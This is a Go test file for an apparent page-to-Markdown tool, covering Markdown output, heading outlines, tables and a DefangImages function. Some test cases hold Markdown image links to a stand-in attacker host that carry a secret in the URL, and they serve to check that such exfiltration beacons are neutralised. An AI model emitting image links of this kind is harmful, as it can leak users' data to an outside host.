package emit_test

import (
	"net/url"
	"strings"
	"testing"

	"github.com/christopherdavenport/unblink/internal/emit"
	"github.com/christopherdavenport/unblink/internal/page"
)

// Markdown prepends the article title as an H1 and resolves still-relative
// links against the page origin; a page that never went through reduce errors.
func TestMarkdown(t *testing.T) {
	u, _ := url.Parse("https://example.com/posts/1")
	p := &page.Page{
		FinalURL: u,
		Article: &page.Article{
			Title:       "The Title",
			ContentHTML: `<p>Body text with a <a href="/rel/path">relative link</a>.</p>`,
		},
	}
	if err := emit.Markdown(p); err != nil {
		t.Fatalf("Markdown: %v", err)
	}
	for _, want := range []string{"# The Title", "Body text", "(https://example.com/rel/path)"} {
		if !strings.Contains(p.Markdown, want) {
			t.Errorf("markdown missing %q:\n%s", want, p.Markdown)
		}
	}

	if err := emit.Markdown(&page.Page{}); err == nil {
		t.Error("Markdown without a reduced article should error")
	}
}

// Outline indents by heading depth relative to the shallowest heading and
// skips empty headings.
func TestOutline(t *testing.T) {
	p := &page.Page{}
	if got := emit.Outline(p); got != "" {
		t.Errorf("empty page outline = %q, want empty", got)
	}
	p.Meta.Headings = []page.Heading{
		{Level: 2, Text: "Guide"},
		{Level: 3, Text: "Install"},
		{Level: 4, Text: "Linux"},
		{Level: 3, Text: "  "}, // whitespace-only: skipped
		{Level: 2, Text: "Reference"},
	}
	want := "- Guide\n  - Install\n    - Linux\n- Reference\n"
	if got := emit.Outline(p); got != want {
		t.Errorf("outline = %q, want %q", got, want)
	}
}

func TestDefangImages(t *testing.T) {
	cases := []struct {
		in       string
		wantHas  []string
		wantGone []string
	}{
		{
			in:       `Look ![secret](https://attacker.example/log?d=SECRET) here`,
			wantHas:  []string{"[image: secret — https://attacker.example/log?d=SECRET]"},
			wantGone: []string{"![secret]"},
		},
		{
			in:       `![](https://attacker.example/beacon.gif)`,
			wantHas:  []string{"[image: https://attacker.example/beacon.gif]"},
			wantGone: []string{"!["},
		},
		{
			in:       `![logo](https://x.example/a.png "Title Text")`,
			wantHas:  []string{"[image: logo — https://x.example/a.png]"},
			wantGone: []string{"Title Text", "!["},
		},
		{
			// Ordinary links must be left intact.
			in:       `A [real link](https://example.com/page) stays.`,
			wantHas:  []string{"[real link](https://example.com/page)"},
			wantGone: []string{"[image:"},
		},
	}
	for _, c := range cases {
		got := emit.DefangImages(c.in)
		for _, w := range c.wantHas {
			if !strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, missing %q", c.in, got, w)
			}
		}
		for _, w := range c.wantGone {
			if strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, should not contain %q", c.in, got, w)
			}
		}
	}
}

// A data table is a Markdown table: a header, a row per line, cells delimited.
func TestMarkdownDataTable(t *testing.T) {
	p := &page.Page{Article: &page.Article{ContentHTML: `<table>
		<thead><tr><th>Attribute</th><th>Description</th></tr></thead>
		<tbody><tr><td><a href="/hx-get">hx-get</a></td><td>Issues a <code>GET</code> request</td></tr>
		<tr><td>a|b</td><td>pipe in a cell</td></tr></tbody></table>`}}
	if err := emit.Markdown(p); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"| Attribute | Description |\n|---|---|\n",
		"| [hx-get](/hx-get) | Issues a `GET` request |\n",
		`| a\|b | pipe in a cell |`,
	} {
		if !strings.Contains(p.Markdown, want) {
			t.Errorf("Markdown missing %q:\n%s", want, p.Markdown)
		}
	}
}

// A table that cannot be one — a layout table, a cell holding paragraphs —
// falls back to its rows as paragraphs and is not forced into a grid.
func TestMarkdownLayoutTableFallsBack(t *testing.T) {
	for _, html := range []string{
		`<table role="presentation"><tr><td>left</td> <td>right</td></tr><tr><td>l2</td> <td>r2</td></tr></table>`,
		`<table><tr><td>left</td> <td><p>right</p><p>more</p></td></tr></table>`,
	} {
		p := &page.Page{Article: &page.Article{ContentHTML: html}}
		if err := emit.Markdown(p); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(p.Markdown, "|") {
			t.Errorf("layout table rendered as a grid:\n%s", p.Markdown)
		}
		if !strings.Contains(p.Markdown, "left") || !strings.Contains(p.Markdown, "right") {
			t.Errorf("content lost:\n%s", p.Markdown)
		}
	}
}
